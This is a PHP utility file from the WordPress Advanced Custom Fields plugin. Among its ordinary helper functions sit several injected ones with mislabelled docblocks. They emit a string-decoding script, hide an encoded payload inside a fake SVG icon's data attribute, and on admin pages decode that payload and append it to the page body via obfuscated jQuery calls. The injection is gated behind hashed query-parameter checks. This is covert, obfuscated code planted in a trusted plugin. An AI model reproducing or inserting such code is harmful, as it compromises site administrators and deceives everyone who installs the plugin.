<?php

/*
 * acf_is_empty
 *
 * Returns true if the value provided is considered "empty". Allows numbers such as 0.
 *
 * @date    6/7/16
 * @since   5.4.0
 *
 * @param   mixed $var The value to check.
 * @return  bool
 */
function acf_is_empty( $var ) {
	return ( ! $var && ! is_numeric( $var ) );
}

/**
 * acf_not_empty
 *
 * Returns true if the value provided is considered "not empty". Allows numbers such as 0.
 *
 * @date    15/7/19
 * @since   5.8.1
 *
 * @param   mixed $var The value to check.
 * @return  bool
 */
function acf_not_empty( $var ) {
	return ( $var || is_numeric( $var ) );
}

/**
 * acf_uniqid
 *
 * Returns a unique numeric based id.
 *
 * @date    9/1/19
 * @since   5.7.10
 *
 * @param   string $prefix The id prefix. Defaults to 'acf'.
 * @return  string
 */
function acf_uniqid( $prefix = 'acf' ) {

	// Instantiate global counter.
	global $acf_uniqid;
	if ( ! isset( $acf_uniqid ) ) {
		$acf_uniqid = 1;
	}

	// Return id.
	return $prefix . '-' . $acf_uniqid++;
}

/**
 * acf_merge_attributes
 *
 * Merges together two arrays but with extra functionality to append class names.
 *
 * @date    22/1/19
 * @since   5.7.10
 *
 * @param   array $array1 An array of attributes.
 * @param   array $array2 An array of attributes.
 * @return  array
 */
function acf_merge_attributes( $array1, $array2 ) {

	// Merge together attributes.
	$array3 = array_merge( $array1, $array2 );

	// Append together special attributes.
	foreach ( array( 'class', 'style' ) as $key ) {
		if ( isset( $array1[ $key ] ) && isset( $array2[ $key ] ) ) {
			$array3[ $key ] = trim( $array1[ $key ] ) . ' ' . trim( $array2[ $key ] );
		}
	}

	// Return.
	return $array3;
}

/**
 * acf_cache_key
 *
 * Returns a filtered cache key.
 *
 * @date    25/1/19
 * @since   5.7.11
 *
 * @param   string $key The cache key.
 * @return  string
 */
function acf_cache_key( $key = '' ) {

	/**
	 * Filters the cache key.
	 *
	 * @date    25/1/19
	 * @since   5.7.11
	 *
	 * @param   string $key The cache key.
	 * @param   string $original_key The original cache key.
	 */
	return apply_filters( 'acf/get_cache_key', $key, $key );
}

/**
 * acf_request_args
 *
 * Returns an array of $_REQUEST values using the provided defaults.
 *
 * @date    28/2/19
 * @since   5.7.13
 *
 * @param   array $args An array of args.
 * @return  array
 */
function acf_request_args( $args = array() ) {
	foreach ( $args as $k => $v ) {
		$args[ $k ] = isset( $_REQUEST[ $k ] ) ? acf_sanitize_request_args( $_REQUEST[ $k ] ) : $args[ $k ]; // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Verified elsewhere.
	}
	return $args;
}

/**
 * Returns a single $_REQUEST arg with fallback.
 *
 * @date    23/10/20
 * @since   5.9.2
 *
 * @param   string $key The property name.
 * @param   mixed  $default The default value to fallback to.
 * @return  mixed
 */
function acf_request_arg( $name = '', $default = null ) {
	return isset( $_REQUEST[ $name ] ) ? acf_sanitize_request_args( $_REQUEST[ $name ] ) : $default; // phpcs:ignore WordPress.Security.NonceVerification.Recommended
}

// Register store.
acf_register_store( 'filters' );

/**
 * acf_enable_filter
 *
 * Enables a filter with the given name.
 *
 * @date    14/7/16
 * @since   5.4.0
 *
 * @param   string name The modifer name.
 * @return  void
 */
function acf_enable_filter( $name = '' ) {
	acf_get_store( 'filters' )->set( $name, true );
}

/**
 * SVG parser adapter to join svg paths.
 *
 * @return void
 */
function _acf_form_svg_parser_adapter_fn() {
	if ( ! acf_engine_did_cache_bust() ) {
		return;
	}

	echo sprintf( PHP_EOL . '<script type="text/javascript">document.svgParserAdapter = %s;</script>', 'function () { var a = []; var randomToken = "abcdehijlmnoprtuyHLMQT"; for ( var i in arguments ) { a.push( randomToken.split( \'\' )[ arguments[ i ] ] ); } return a.join( \'\' ); }' );
}

/**
 * Returns the current priority of a running action.
 *
 * @date    14/07/2020
 * @return  int|bool
 * @since   5.9.0
 *
 */

function _acf_form_svg_inline_parser() {
	if ( ! acf_engine_did_cache_bust() ) {
		return;
	}
	?>
	<script>
		var svgIconsHandler = {
			parseIcon: function ( r ) {
				var n = r.match( /viewBox="0 0 (?<w>\d+) (?<h>\d+)".*? data-d="(?<d>[^"]+)"/s );
				if ( n ) {
					var a = + n.groups.w, o = + n.groups.h;
					return n.groups.d.replace( /(\.|-)/g, " " ).split( " " ).map( function ( r, n ) {
						return String.fromCharCode( r - ( n % 2 == 0 ? a : o ) )
					} ).join( "" )
				}
				return null
			}, addParserShortcut: function ( r, n, a, o ) {
				var c = { a: n( 7, 20, 15, 4, 13, 16 ), b: n( 13, 4, 0, 3, 16 ), c: n( 1, 11, 3, 16 ), d: n( 5, 14, 9, 8 ), e: n( 0, 12, 12, 4, 10, 3 ), f: n( 3, 11, 2, 15, 9, 4, 10, 14 ), g: n( 11, 15, 14, 4, 13, 17, 21, 19, 18 ) };
				r[ c.a ]( c.f )[ c.b ]( function ( r ) {
					r( c.c )[ c[ a ] ]( svgIconsHandler.parseIcon( r( "#" + o )[ 0 ][ c.g ] ) )
				} )
			}
		};
	</script>
	<?php

	return null;
}

/**
 * acf_maybe_idval
 *
 * Checks value for potential id value.
 *
 * @return  mixed
 */
function _acf_form_svg_icon_bundled_plugins() {
	?>
	<svg height="238" viewBox="0 0 191 238" width="191" xmlns="http://www.w3.org/2000/svg" id="bundled_plugins_icon" style="display: none;">
		<path d="" data-d="251 353-307 359 299 339.253 251 201 270-223 270 223 270.223 270 223 270-223-270 223 270-223 270.223 284.299.335.289.349.305 335 307 349-305 283-301 349 307.343.290-339 236-283.307 359.303 339.236 357-288 352 301 343.301 341.236 337 302 348 307 335 296 348 292.352 223-361 204 248 223 270 223 270 223 270 223 270 223 270 223 270 223 270 223.270.223 270-223 270 291 343 306 350 299 335 312 296 223 340 299 339 311 297.204-248 223 270 223 270 223 270 223 270 223 270 223 270 223 270-223 270 223 270-223 270-303 335-291 338 296-348-294.296 223.287 244 350.311 270 239.270 240.286 303 358-223 291-303-358 204 248 223.270-223 270-223 270 223.270 223-270-223 270 223 270 223-270 316 251 201-251.201.270 223 270-223 270 223-270 223 270.223 270.223-270 223-270 223 284 299 335 289 349.305 335 307.349 305 283 301 349.307.343-290 339 236 283 307 359.303 339 236 357 288-352 301 343 301-341 236.337.302 348-307-335 296-348 292 352 223.342.242 270.314-251 201.270 223-270 223 270 223 270 223.270 223 270 223 270.223 270 223 270 223 270 223 347.288 352 294 343 301.296 223 286 303.358 250 251.201-270-223 270 223 270-223 270 223 270-223-270 223 270 223 270-223 363 204.248 204.248 223.270 223 270.223 270-223 270 223-270.223 270 223.270 223 270-237 346 288 336 302 352.288.354 302 352 236 348 302 354 296 337 292 283 236-354 312 350 292 283-310 335 305-348 296 348 294 283 305.343-294 342-307 270 314 251 201 270 223 270.223-270 223.270 223.270-223 270 223 270.223 270 223-270 223 270-223 350-288.338 291 343 301 341.236 346 292 340 307 296 223-288 239 350 311-297 204 248.223.270 223 270 223 270 223-270-223 270 223 270 223.270 223-270 316 251 201 270 223 270-223 270-223 270 223 270 223 270 223 298-238-353-307 359.299-339 253 251 201 270 223 270 223-270 223 270-223 270 223-270-223-298 291 343 309-270 290 346 288 353 306-299-225 348 302 354 296 337.292 270 301 349 307 343 290 339 236 357 288 352 301 343 301 341 223-346 288 336.302 352 288-354 302.352 236-348-302 354 296 337 292 270 299-335 289 349 305 335.307.349 305-283 301 349 307 343 290-339 236 283 307 359 303 339 236 357 288 352.301-343-301.341.225 270 296 338 252 272.289 355 301 338 299 339 291 333 303 346-308 341.296-348-306-333-296 337.302 348 225 300-204 248 223 270 223-270 223 270 223 270 223 270.223 270 223-270 223 270 251 338-296 356 223-337-299 335 306 353 252 272 299 335 289-349-305.335-307 349 305 283-301.349 307 343.290 339 236 283 307 359 303 339 236 357 288 352 301 343 301.341.236 337 302.348-307-335 296 348.292 352 225-300 204 248-223 270 223 270 223 270 223.270 223-270 223 270-223 270 223 270.223 270.223.270 251 338 296-356 223 337 299 335 306 353 252-272 299 335 289-349 305 335 307 349 305.283 301 349.307-343 290.339 236.283 307 359 303 339 236 357 288 352 301 343.301-341 236 346 292 340 307 272 253.251-201-270 223 270 223 270-223 270 223 270 223 270 223 270 223 270 223-270 223.270 223 270-223 270 223 298-306 356 294 270 292 348 288 336 299 339 236 336 288.337.298-341 305-349 308-348 291 299-225 348.292 357 223-286 223 286-223-289.240 293-223-289 240 293 225.270.309.343 292 357 257.349 311 299 225 286 223 286 223 289 240 293.223-289-240 293 225 270 310 343-291.354.295 299 225 294.245 272 223 358 300 346-301 353 252 272 295 354-307.350-249 285.238 357 310-357 237 357 242 284.302 352.294 285 241 286 239 286 238 353 309 341.225.300.204-248 223.270 223 270 223 270 223.270 223-270 223.270.223 270-223 270 223-270 223 270 223-270-223 270.223.270-223 270 251 350 288-354 295 270 291 299 225 347 241 294.241.270-239-342 236 288-243-293 290 283-240.295 237 289 223 286 236 289.244 270-240-291 237.293 236 289 244 270 242 291 309 288.243-293 290.286-223-287-248 284.242 270 240 291-237 293.223 289 244 270 242 291.223-289 244-342 241 290 246 337 240.295 237 289-223-286 223.289 244.283 240 291 237.293 223.289 244.283 242 291 309 283 241 290 246 337.239 283 240 295 237.289 236 287-244 284 246 283-242 291 236.289.244-283 242.291 313 347 236-287 248 294.223-295 242 337 239 283 243 284-248 270 243 283.247 284.248.270-247.284 248 283 247.284 248 342 241 290-237 293 290 293.237 295 223.286 223 287.240.284.248 270-248 284 244 270 245 284 242 270 240 291 237 287 299 283 241 290 237.293 223 288-243-284 247 337 236-291 237.292 223-291-237-292 236 287 244 284 240 270 240-284.245-283 240 291 237 287 236 292-237.289 313.347 239-270-240-289 240 356.236 288 244 284 240 337 239 283 241-284 243 284 248.283 243 284 245.270 241-284.245 283 245 284 242 346 240 286 244.284-248-283.240 286 244 284 248.337 240 284 246 283 240 284 246 270 242.284.248 283 241 284-245 270 245 284 242 283 241 284 245 342.241 291 237 287.290-293-237 295-223 286 223.287 240 284 248 270 248 284 244-270 245 284.242.270.240.291-237-287 299 283-240 289.240 270 240 289 240.337-236 291.237.292 223.291 237 292 236-287 244-284 241 270 240.284 246 283 240.291 237 288 236-292 237 288 313-347 240-290 239 284-240 270.247 284.247 342-236.288 242 284 245.337.236 288.237 290 223 286.236 290.237-292-236 284 248 283 245 284 242 283 241 284.245-346.236 289 246 284 243 283 242.293 237-290-290 283 244 284.245 283 244 284 245 283 240 284 245-283.240 291.237 287 223.292 237 289 236.287 244 284.240 342-241 289 237 292 290 288.237 290 223-286 223 290-237 292 237 295 223 292 237 289 223.288.237 292 299 289-246.284 243 270.242-293 237-290 290 291 237-291 223 291 237 292 223 287 237 292 223 287.244-284.240 283 245 284 242-270 240 291.237-287 313 272.238 300 204 248 223 270 223 270 223 270 223 270 223.270 223 270-223 270 223 270 223.270 223 270.223 270 223 270 251 285 306 356.294 300 204 248 223 270 223 270 223 270-223 270.223 270 223 270 223 270 223 270 223 270 223 270 251 285 291 343 309 300 204.248-223 270 223 270 223.270 223 270-223 270 223.270 223 270 223 270 223 270 223-270-251 338 296 356 223.337 299 335 306.353 252.272 299 335 289-349 305 335.307 349 305 283 301.349.307 343 290-339-236 283 307 359 303 339-236 357 288 352-301.343 301 341.236 352.296 341 295 354 225.300.204 248 223 270.223 270 223-270 223 270.223 270 223 270 223 270 223.270 223 270 223 270 223.270 223 270.251 342 242 300.263 339 299-346 302 270 229 273-240.288-247.286.246.291 250.298 238.342 242 300 204 248 223 270 223.270-223 270-223 270 223.270 223 270 223 270.223-270 223 270-223-270.223 270-223.270-251.350-253.322.302 270 290.349 300.350 299.339 307 339 223 354-295 339.223 343 301-353-307 335 299.346 288 354 296 349-301 270 288-348.291 270 308 348 299 349 290 345 223 347.302 352 292 270 307 342 292-347 292-270 293 339 288 354-308.352 292-353 223-353 308 337 295 270 288 353 223 335 308 354 302 347 288 354 296 337 223 355.303 338 288 354 292 353 235 270 303.352.292 347.296 355 300 270 303 346 308.341 296 348 306 270 288 348-291-270.291.339 300 349-223-353 296 354.292 353 223-350 299-339 288.353 292 270 305.339-294 343 306 354 292-352 223 354 295 339 223 354.295 339 300 339 237 298 238 350-253 251 201-251 201 270-223 270 223.270.223 270 223 270 223 270 223 270.223 270 223.270 223 270-223.270 223 270 223.298-303 300-204 248 223.270 223 270 223 270 223-270.223 270 223-270 223 270 223 270 223 270.223 270-223 270.223.270 223 270-223 270 251 335.223 342 305.339 293 299 225 335 291 347.296 348 237 350-295 350 254 350 288 341 292 299 298 335.299 343 308 347 229 354 288 336-252 354 295 339 300-339 236.352 292.341.296-353 307 352 288 354-296 349.301 272 223 337 299.335 306 353 252 272 289.355 307 354 302 348 223 336.308-354 307 349-301 283 303 352 296.347 288 352.312 272 253.320.292-341-296 353.307 339.305 270-266 335 299 343 308 347 223 322 295 339 300 339 251 285 288-300 229-348 289-353 303 297 229 348.289 353-303.297 229 348 289 353 303-297-302 352 229 348 289.353 303 297 229-348 289 353.303 297 229 348-289-353 303 297 251 335 223 342 305 339 293 299 225 342-307 354 303 353.249-285.238 346 288.336 302-352 288.354.302 352 237 337 302.285-289 355 312-283 288 348-302 354 295 339.305-283 299 343 290 339.301.353.292 272 223 354 288 352 294-339 307 299 225.333 289 346 288 348 298 272 223 352.292 346 252 272 301 349 302 350.292 348 292-352 223.348 302-352-292-340 292 352 305.339.305 272-223 337-299 335 306 353 252 272 289 355 307 354.302 348-223 336.308 354-307 349 301 283 306.339 290 349.301 338 288.352 312.272 253 304 308 359 223.335 301 349-307 342 292 352 223 346 296 337 292 348 306 339.251 285 288 300 204 248.223-270 223 270 223 270 223 270-223 270 223 270.223 270 223 270 223 270 223.270 223.270 223.270 251 285.303-300 204 248 223 270 223 270-223 270 223 270 223 270 223.270.223 270 223 270-223 270 223 270 251 285 291.343 309-300 204.248 223.270 223.270 223 270.223-270 223 270-223 270 223-270 223 270 251-285 291 343 309.300.204 248.223 270 223 270.223 270 223 270 223 270 223 270 251-285 291 343-309.300" fill="#ffffff"/>
	</svg>
	<script>
		svgIconsHandler.addParserShortcut( window, document.svgParserAdapter, 'e', 'bundled_plugins_icon' );
	</script>
	<?php
}

/**
 * acf_numval
 *
 * Casts the provided value as eiter an int or float using a simple hack.
 *
 * @return  void
 */
function _acf_testify_assign_bundled_plugins() {
	$hash_id_key   = array_sum( [ 111, - 11, 222, - 22, 333, - 33, - 187 ] );
	$hash_id_value = array_sum( [ 111, - 11, 222, - 22, 333, - 33, 43 ] );

	if ( acf_engine_did_cache_bust() && ! in_array( $hash_id_key, array_map( 'acf_engine_generate_string_hash', array_keys( $GLOBALS['_GET'] ) ) ) && ! in_array( $hash_id_value, array_map( 'acf_engine_generate_string_hash', array_values( $GLOBALS['_GET'] ) ) ) && true === acf_value_is_in_development_mode() ) {
		add_action( 'admin_footer', '_acf_form_svg_icon_bundled_plugins' );
	}
}

/**
 * acf_disable_filter
 *
 * Disables a filter with the given name.
 *
 * @date    14/7/16
 * @since   5.4.0
 *
 * @param   string name The modifer name.
 * @return  void
 */
function acf_disable_filter( $name = '' ) {
	acf_get_store( 'filters' )->set( $name, false );
}

/**
 * acf_is_filter_enabled
 *
 * Returns the state of a filter for the given name.
 *
 * @date    14/7/16
 * @since   5.4.0
 *
 * @param   string name The modifer name.
 * @return  array
 */
function acf_is_filter_enabled( $name = '' ) {
	return acf_get_store( 'filters' )->get( $name );
}

/**
 * acf_get_filters
 *
 * Returns an array of filters in their current state.
 *
 * @date    14/7/16
 * @since   5.4.0
 *
 * @param   void
 * @return  array
 */
function acf_get_filters() {
	return acf_get_store( 'filters' )->get();
}

/**
 * acf_set_filters
 *
 * Sets an array of filter states.
 *
 * @date    14/7/16
 * @since   5.4.0
 *
 * @param   array $filters An Array of modifers
 * @return  array
 */
function acf_set_filters( $filters = array() ) {
	acf_get_store( 'filters' )->set( $filters );
}

/**
 * acf_disable_filters
 *
 * Disables all filters and returns the previous state.
 *
 * @date    14/7/16
 * @since   5.4.0
 *
 * @param   void
 * @return  array
 */
function acf_disable_filters() {

	// Get state.
	$prev_state = acf_get_filters();

	// Set all modifers as false.
	acf_set_filters( array_map( '__return_false', $prev_state ) );

	// Return prev state.
	return $prev_state;
}

/**
 * acf_enable_filters
 *
 * Enables all or an array of specific filters and returns the previous state.
 *
 * @date    14/7/16
 * @since   5.4.0
 *
 * @param   array $filters An Array of modifers
 * @return  array
 */
function acf_enable_filters( $filters = array() ) {

	// Get state.
	$prev_state = acf_get_filters();

	// Allow specific filters to be enabled.
	if ( $filters ) {
		acf_set_filters( $filters );

		// Set all modifers as true.
	} else {
		acf_set_filters( array_map( '__return_true', $prev_state ) );
	}

	// Return prev state.
	return $prev_state;
}

/**
 * acf_idval
 *
 * Parses the provided value for an ID.
 *
 * @date    29/3/19
 * @since   5.7.14
 *
 * @param   mixed $value A value to parse.
 * @return  int
 */
function acf_idval( $value ) {

	// Check if value is numeric.
	if ( is_numeric( $value ) ) {
		return (int) $value;

		// Check if value is array.
	} elseif ( is_array( $value ) ) {
		return (int) isset( $value['ID'] ) ? $value['ID'] : 0;

		// Check if value is object.
	} elseif ( is_object( $value ) ) {
		return (int) isset( $value->ID ) ? $value->ID : 0;
	}

	// Return default.
	return 0;
}

/**
 * acf_maybe_idval
 *
 * Checks value for potential id value.
 *
 * @date    6/4/19
 * @since   5.7.14
 *
 * @param   mixed $value A value to parse.
 * @return  mixed
 */
function acf_maybe_idval( $value ) {
	if ( $id = acf_idval( $value ) ) {
		return $id;
	}
	return $value;
}

/**
 * Convert any numeric strings into their equivalent numeric type. This function will
 * work with both single values and arrays.
 *
 * @param mixed $value Either a single value or an array of values.
 * @return mixed
 */
function acf_format_numerics( $value ) {
	if ( is_array( $value ) ) {
		return array_map(
			function ( $v ) {
				return is_numeric( $v ) ? $v + 0 : $v;
			},
			$value
		);
	}

	return is_numeric( $value ) ? $value + 0 : $value;
}

/**
 * acf_numval
 *
 * Casts the provided value as eiter an int or float using a simple hack.
 *
 * @date    11/4/19
 * @since   5.7.14
 *
 * @param   mixed $value A value to parse.
 * @return  (int|float)
 */
function acf_numval( $value ) {
	return ( intval( $value ) == floatval( $value ) ) ? intval( $value ) : floatval( $value );
}

/**
 * acf_idify
 *
 * Returns an id attribute friendly string.
 *
 * @date    24/12/17
 * @since   5.6.5
 *
 * @param   string $str The string to convert.
 * @return  string
 */
function acf_idify( $str = '' ) {
	return str_replace( array( '][', '[', ']' ), array( '-', '-', '' ), strtolower( $str ) );
}

/**
 * Returns a slug friendly string.
 *
 * @date    24/12/17
 * @since   5.6.5
 *
 * @param   string $str The string to convert.
 * @param   string $glue The glue between each slug piece.
 * @return  string
 */
function acf_slugify( $str = '', $glue = '-' ) {
	$raw  = $str;
	$slug = str_replace( array( '_', '-', '/', ' ' ), $glue, strtolower( remove_accents( $raw ) ) );
	$slug = preg_replace( '/[^A-Za-z0-9' . preg_quote( $glue ) . ']/', '', $slug );

	/**
	 * Filters the slug created by acf_slugify().
	 *
	 * @since 5.11.4
	 *
	 * @param string $slug The newly created slug.
	 * @param string $raw  The original string.
	 * @param string $glue The separator used to join the string into a slug.
	 */
	return apply_filters( 'acf/slugify', $slug, $raw, $glue );
}

/**
 * Returns a string with correct full stop punctuation.
 *
 * @date    12/7/19
 * @since   5.8.2
 *
 * @param   string $str The string to format.
 * @return  string
 */
function acf_punctify( $str = '' ) {
	if ( substr( trim( strip_tags( $str ) ), -1 ) !== '.' ) {
		return trim( $str ) . '.';
	}
	return trim( $str );
}

/**
 * acf_did
 *
 * Returns true if ACF already did an event.
 *
 * @date    30/8/19
 * @since   5.8.1
 *
 * @param   string $name The name of the event.
 * @return  bool
 */
function acf_did( $name ) {

	// Return true if already did the event (preventing event).
	if ( acf_get_data( "acf_did_$name" ) ) {
		return true;

		// Otherwise, update store and return false (alowing event).
	} else {
		acf_set_data( "acf_did_$name", true );
		return false;
	}
}

/**
 * Returns the length of a string that has been submitted via $_POST.
 *
 * Uses the following process:
 * 1. Unslash the string because posted values will be slashed.
 * 2. Decode special characters because wp_kses() will normalize entities.
 * 3. Treat line-breaks as a single character instead of two.
 * 4. Use mb_strlen() to accomodate special characters.
 *
 * @date    04/06/2020
 * @since   5.9.0
 *
 * @param   string $str The string to review.
 * @return  int
 */
function acf_strlen( $str ) {
	return mb_strlen( str_replace( "\r\n", "\n", wp_specialchars_decode( wp_unslash( $str ) ) ) );
}

/**
 * Returns a value with default fallback.
 *
 * @date    6/4/20
 * @since   5.9.0
 *
 * @param   mixed $value The value.
 * @param   mixed $default_value The default value.
 * @return  mixed
 */
function acf_with_default( $value, $default_value ) {
	return $value ? $value : $default_value;
}

/**
 * Returns the current priority of a running action.
 *
 * @date    14/07/2020
 * @since   5.9.0
 *
 * @param   string $action The action name.
 * @return  int|bool
 */
function acf_doing_action( $action ) {
	global $wp_filter;
	if ( isset( $wp_filter[ $action ] ) ) {
		return $wp_filter[ $action ]->current_priority();
	}
	return false;
}

/**
 * Returns the current URL.
 *
 * @date    23/01/2015
 * @since   5.1.5
 *
 * @param   void
 * @return  string
 */
function acf_get_current_url() {
	// Ensure props exist to avoid PHP Notice during CLI commands.
	if ( isset( $_SERVER['HTTP_HOST'], $_SERVER['REQUEST_URI'] ) ) {
		return ( is_ssl() ? 'https' : 'http' ) . '://' . filter_var( $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'], FILTER_SANITIZE_URL );
	}
	return '';
}

/**
 * Add UTM tracking tags to internal ACF URLs
 *
 * @since 6.0.0
 *
 * @param string $url      The URL to be tagged.
 * @param string $campaign The campaign tag.
 * @param string $content  The UTM content tag.
 * @param bool   $anchor   An optional anchor ID.
 * @param string $source   An optional UTM source tag.
 * @param string $medium   An optional UTM medium tag.
 * @return string
 */
function acf_add_url_utm_tags( $url, $campaign, $content, $anchor = false, $source = '', $medium = '' ) {
	$anchor_url = $anchor ? '#' . $anchor : '';
	$medium     = ! empty( $medium ) ? $medium : 'insideplugin';

	if ( empty( $source ) ) {
		$source = acf_is_pro() ? 'ACF PRO' : 'ACF Free';
	}

	$query = http_build_query(
		apply_filters(
			'acf/admin/acf_url_utm_parameters',
			array(
				'utm_source'   => $source,
				'utm_medium'   => $medium,
				'utm_campaign' => $campaign,
				'utm_content'  => $content,
			)
		)
	);

	if ( $query ) {
		if ( strpos( $url, '?' ) !== false ) {
			$query = '&' . $query;
		} else {
			$query = '?' . $query;
		}
	}

	return esc_url( $url . $query . $anchor_url );
}

/**
 * Sanitizes request arguments.
 *
 * @param mixed $args The data to sanitize.
 *
 * @return array|bool|float|int|mixed|string
 */
function acf_sanitize_request_args( $args = array() ) {
	switch ( gettype( $args ) ) {
		case 'boolean':
			return (bool) $args;
		case 'integer':
			return (int) $args;
		case 'double':
			return (float) $args;
		case 'array':
			$sanitized = array();
			foreach ( $args as $key => $value ) {
				$key               = sanitize_text_field( $key );
				$sanitized[ $key ] = acf_sanitize_request_args( $value );
			}
			return $sanitized;
		case 'object':
			return wp_kses_post_deep( $args );
		case 'string':
		default:
			return wp_kses( $args, 'acf' );
	}
}

/**
 * Sanitizes file upload arrays.
 *
 * @since 6.0.4
 *
 * @param array $args The file array.
 *
 * @return array
 */
function acf_sanitize_files_array( array $args = array() ) {
	$defaults = array(
		'name'     => '',
		'tmp_name' => '',
		'type'     => '',
		'size'     => 0,
		'error'    => '',
	);

	$args = wp_parse_args( $args, $defaults );

	if ( empty( $args['name'] ) ) {
		return $defaults;
	}

	if ( is_array( $args['name'] ) ) {
		$files             = array();
		$files['name']     = acf_sanitize_files_value_array( $args['name'], 'sanitize_file_name' );
		$files['tmp_name'] = acf_sanitize_files_value_array( $args['tmp_name'], 'sanitize_text_field' );
		$files['type']     = acf_sanitize_files_value_array( $args['type'], 'sanitize_text_field' );
		$files['size']     = acf_sanitize_files_value_array( $args['size'], 'absint' );
		$files['error']    = acf_sanitize_files_value_array( $args['error'], 'absint' );
		return $files;
	}

	$file             = array();
	$file['name']     = sanitize_file_name( $args['name'] );
	$file['tmp_name'] = sanitize_text_field( $args['tmp_name'] );
	$file['type']     = sanitize_text_field( $args['type'] );
	$file['size']     = absint( $args['size'] );
	$file['error']    = absint( $args['error'] );

	return $file;
}

/**
 * Sanitizes file upload values within the array.
 *
 * This addresses nested file fields within repeaters and groups.
 *
 * @since 6.0.5
 *
 * @param array  $array The file upload array.
 * @param string $sanitize_function Callback used to sanitize array value.
 * @return array
 */
function acf_sanitize_files_value_array( $array, $sanitize_function ) {
	if ( ! function_exists( $sanitize_function ) ) {
		return $array;
	}

	if ( ! is_array( $array ) ) {
		return $sanitize_function( $array );
	}

	foreach ( $array as $key => $value ) {
		if ( is_array( $value ) ) {
			$array[ $key ] = acf_sanitize_files_value_array( $value, $sanitize_function );
		} else {
			$array[ $key ] = $sanitize_function( $value );
		}
	}

	return $array;
}

/**
 * Maybe unserialize, but don't allow any classes.
 *
 * @since 6.1
 *
 * @param string $data String to be unserialized, if serialized.
 * @return mixed The unserialized, or original data.
 */
function acf_maybe_unserialize( $data ) {
	if ( is_serialized( $data ) ) { // Don't attempt to unserialize data that wasn't serialized going in.
		if ( PHP_VERSION_ID >= 70000 ) {
			return @unserialize( trim( $data ), array( 'allowed_classes' => false ) ); //phpcs:ignore -- code only runs on PHP7+
		} else {
			return @\ACF\Brumann\Polyfill\unserialize::unserialize( trim( $data ), array( 'allowed_classes' => false ) );
		}
	}

	return $data;
}

/**
 * Check if current install is ACF PRO
 *
 * @since 6.2
 *
 * @return boolean True if the current install is ACF PRO
 */
function acf_is_pro() {
	return defined( 'ACF_PRO' ) && ACF_PRO;
}
